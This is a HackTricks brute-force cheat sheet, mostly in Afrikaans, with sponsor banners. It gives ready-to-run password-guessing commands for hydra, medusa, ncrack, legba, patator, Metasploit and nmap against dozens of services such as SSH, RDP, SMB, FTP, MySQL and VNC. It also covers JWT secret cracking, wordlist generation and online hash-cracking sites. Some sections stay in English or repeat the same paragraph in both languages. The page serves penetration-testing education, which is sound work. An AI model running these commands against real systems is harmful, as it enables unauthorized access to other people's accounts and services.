# Brute Force - Spiekbrief

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en **outomatiese werksvloei** te bou wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Standaard Gelde

**Soek in Google** vir die standaardgelde van die tegnologie wat gebruik word, of **probeer hierdie skakels**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Skep jou eie Woordeboeke**

Vind soveel moontlike inligting oor die teiken en genereer 'n aangepaste woordeboek. Gereedskap wat kan help:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is 'n hulpmiddel wat gebruik word om woorde uit 'n webwerf te onttrek en 'n woordelys te skep vir aanvalle met geweld. Dit kan help om doelwitsleutels te identifiseer vir aanvalle met geweld.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genereer wagwoorde gebaseer op jou kennis van die slagoffer (name, datums...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

'n Woordelys generator instrument, wat jou toelaat om 'n stel woorde te voorsien, wat jou die moontlikheid gee om verskeie variasies van die gegewe woorde te skep, 'n unieke en ideale woordelys te skep om te gebruik met betrekking tot 'n spesifieke teiken.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Woordlyste

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome** te bou en outomatiseer met die wêreld se **mees gevorderde** gemeenskaplike gereedskap.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Dienste

Gereël in alfabetiese volgorde volgens diensnaam.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a binary protocol that can be used to communicate with a web server. It is often used to connect web servers with servlet containers, such as Apache Tomcat. A common attack method against AJP is brute-forcing credentials to gain unauthorized access.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM en Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

#### Brute Force

Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method can be effective but is time-consuming and resource-intensive. It is important to use strong and unique passwords to protect against brute force attacks.

#### Afrikaans Translation

#### Brute Force

Brute force-aanvalle behels om alle moontlike kombinasies van gebruikersname en wagwoorde te probeer totdat die regte een gevind word. Hierdie metode kan effektief wees, maar dit verg baie tyd en hulpbronne. Dit is belangrik om sterk en unieke wagwoorde te gebruik om teen brute force-aanvalle te beskerm.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

Brute-force attacks against CouchDB are relatively simple to execute. The most common method is to use a tool like Hydra to repeatedly try different username and password combinations until the correct one is found. This can be effective if the credentials are weak or if the server is not properly configured to prevent multiple login attempts. It is important to note that brute-force attacks can be detected and blocked by security measures such as account lockouts or CAPTCHA challenges.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Register
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be used to crack weak passwords or gain unauthorized access to systems. In Elasticsearch, brute force attacks can be mitigated by implementing security measures such as strong password policies, account lockout mechanisms, and monitoring for suspicious login attempts.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) is 'n protokol wat gebruik word om lêers oor 'n netwerk te stuur.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Generiese Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basiese Verifisering
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

Brute force attacks against HTTP NTLM authentication can be performed using tools like Hydra or Medusa. These tools allow you to automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute force attacks can be time-consuming and resource-intensive, so it is recommended to use them as a last resort.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Pos Vorm
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Vir http**s** moet jy verander van "http-post-form" na "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla of (D)rupal of (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. IMAP allows an email client to access email on the server. It is commonly used for receiving emails.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

#### Brute Force

Brute force attacks on IRC servers are usually performed using automated scripts that try to guess usernames and passwords. These scripts can be easily found online and are relatively simple to use. Attackers can use these scripts to try a large number of username and password combinations until they find one that works. To protect against brute force attacks on IRC servers, it is important to use strong, unique passwords and implement account lockout policies to prevent multiple login attempts.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

#### Brute Force

Brute force attacks against iSCSI targets are relatively straightforward. Attackers can use tools like Hydra or Nmap to perform brute force attacks by trying different combinations of usernames and passwords until the correct one is found. This method can be time-consuming but can be effective if weak credentials are used. 

#### Mitigation

To mitigate brute force attacks against iSCSI targets, it is essential to use strong, complex passwords and implement account lockout policies to prevent multiple failed login attempts. Additionally, monitoring and logging login attempts can help detect and respond to brute force attacks in a timely manner.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Tokens) is 'n open standaard (RFC 7519) wat 'n veilige manier bied om inligting tussen partye te ruil as JSON-voorwerpe. Hierdie inligting kan geverifieer en vertrou word omdat dit digitaal onderteken is. JWT's kan gebruik word vir verifikasie en uitruil van inligting tussen partye.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) is 'n protokol wat gebruik word om inligting uit 'n gidsdiens te onttrek. Dit kan gebruik word vir aanmelding, soekopdragte, en ander gidsverwante take. LDAP-bruteforce-aanvalle kan gebruik word om geldige aanmeldingsbesonderhede te agterhaal deur verskeie aanmeldingspogings met verskillende wagwoorde te maak.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) is 'n ligte boodskap protokol wat ontwerp is vir klein toestelle met beperkte verwerking en bandwydte hulpbronne. MQTT word dikwels gebruik vir die kommunikasie tussen toestelle in die Internet of Things (IoT) konteks.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

Brute-force attacks against MSSQL servers are common due to weak passwords. Tools like Hydra, Ncrack, and Metasploit can be used for this purpose. It's important to use strong passwords and implement account lockout policies to prevent successful brute-force attacks.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

#### Brute Force

Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method is commonly used to gain unauthorized access to MySQL databases. Attackers use automated tools to systematically try different combinations until they find the right credentials. To protect against brute force attacks, it is essential to use strong and unique passwords, implement account lockout policies, and monitor for multiple failed login attempts.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

Brute-force attacks against OracleSQL databases involve attempting to guess usernames and passwords to gain unauthorized access. These attacks can be carried out using automated tools that systematically try different combinations of usernames and passwords until the correct one is found. It is essential to use strong, unique passwords and implement account lockout policies to protect against brute-force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Om **oracle\_login** met **patator** te gebruik, moet jy dit **installeer**:
```bash
pip3 install cx_Oracle --upgrade
```
[Aflyn OracleSQL-hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**weergawes 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** en **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method is time-consuming but effective against weak passwords. Tools like Hydra and Medusa can automate the process.

#### Dictionary Attack

A dictionary attack uses a predefined list of words to try as passwords. This method is more efficient than brute force as it targets common passwords first. Tools like John the Ripper and Hashcat are commonly used for dictionary attacks.

#### Rainbow Table Attack

Rainbow table attacks use precomputed tables of hashed passwords to crack passwords quickly. This method is faster than brute force and dictionary attacks. Tools like Ophcrack and RainbowCrack are used for rainbow table attacks.

#### Credential Stuffing

Credential stuffing involves using automated tools to try large numbers of username/password combinations obtained from previous data breaches. This method relies on users reusing passwords across different accounts. Tools like Sentry MBA and SNIPR are used for credential stuffing attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be effective but is time-consuming and resource-intensive. It is important to use strong, complex passwords to mitigate the risk of a successful brute force attack.

#### Brute Force Protection

To protect against brute force attacks, consider implementing the following measures:

- **Lockout Policies:** Implement lockout policies that lock out users after a certain number of failed login attempts.
- **Account Lockout:** Automatically lock user accounts after multiple failed login attempts to prevent further unauthorized access.
- **Strong Passwords:** Enforce the use of strong, complex passwords that are difficult to guess.
- **Multi-Factor Authentication (MFA):** Implement MFA to add an extra layer of security beyond just a password.
- **Monitoring:** Regularly monitor login attempts and look for any unusual patterns that may indicate a brute force attack in progress.

By implementing these measures, you can significantly reduce the risk of a successful brute force attack on your PostgreSQL database.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Jy kan die `.deb` pakkie aflaai om te installeer vanaf [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. RDP is commonly used for remote administration and accessing virtual desktops. 

#### Brute Force Attack

A brute force attack against an RDP server involves trying all possible username and password combinations until the correct one is found. This is typically achieved using automated tools that can rapidly try different combinations. Brute force attacks can be mitigated by implementing strong password policies, account lockout mechanisms, and using multi-factor authentication.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis is 'n in-memory data store wat dikwels gebruik word vir caching en sessiebeheer in webtoepassings. Dit kan ook gebruik word vir die hantering van boodskappe in 'n boodskapgeorkestreerde stelsel.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

#### Brute Force

Brute force attacks are a common way to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method is often used when other techniques, such as social engineering or exploiting vulnerabilities, are not successful. Brute force attacks can be time-consuming but are effective if the passwords are weak or easily guessable.

#### Mitigation

To mitigate brute force attacks, it is essential to use strong and complex passwords, implement account lockout policies, and use multi-factor authentication. Additionally, monitoring login attempts and setting up intrusion detection systems can help detect and prevent brute force attacks. Regularly updating systems and software can also help prevent vulnerabilities that attackers may exploit during a brute force attack.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

#### Brute Force

Brute force is a common technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method can be used to target the Rlogin service, attempting to log in without proper credentials. It is important to note that brute force attacks can be detected and prevented by implementing strong password policies, account lockout mechanisms, and monitoring for suspicious login attempts.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh is a remote shell program that allows users to execute commands on a remote system. It can be used in brute-force attacks to guess passwords and gain unauthorized access to a system.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be used to crack passwords for RTSP services. It is essential to use strong and complex passwords to prevent successful brute force attacks.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

### SNMP
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS is a protocol that routes network packets between a client and a server through a proxy server. It can be used to bypass firewalls and perform network reconnaissance.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL-bediener
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

### SSH
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Swakke SSH-sleutels / Debian voorspelbare PRNG

Sommige stelsels het bekende foute in die lukraak saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot 'n dramaties verminderde sleutelruimte wat met gereedskap soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) gekraak kan word. Vooraf gegenereerde stelle swak sleutels is ook beskikbaar soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ en OpenMQ)

Die STOMP-teksprotokol is 'n wyd gebruikte boodskapprotokol wat **naadlose kommunikasie en interaksie met gewilde boodskie-opeenhopingsdiens** soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ moontlik maak. Dit bied 'n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapbedrywighede uit te voer.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet is 'n netwerkprotokol wat gebruik word om 'n verbindingsessie met 'n ander rekenaar te skep. Dit kan gebruik word vir die uitvoering van brute force-aanvalle deur herhaaldelik probeer om aan te meld by 'n stelsel deur verskillende gebruikersnaam- en wagwoordkombinasies te probeer.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

#### Brute Force

Brute force attacks against VNC servers involve attempting to log in by systematically trying all possible passwords until the correct one is found. This can be achieved using tools like Hydra or Medusa. It is important to note that brute force attacks can be time-consuming and resource-intensive, and may trigger account lockouts or other security measures.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome te bou** en outomatiseer met die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Plaaslik

### Aanlyn kraak databasisse

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 met/sonder ESS/SSP en met enige uitdaging se waarde)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashe, WPA2 vangste, en argiewe MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashe)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashe en lêerhashe)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashe)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashe)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

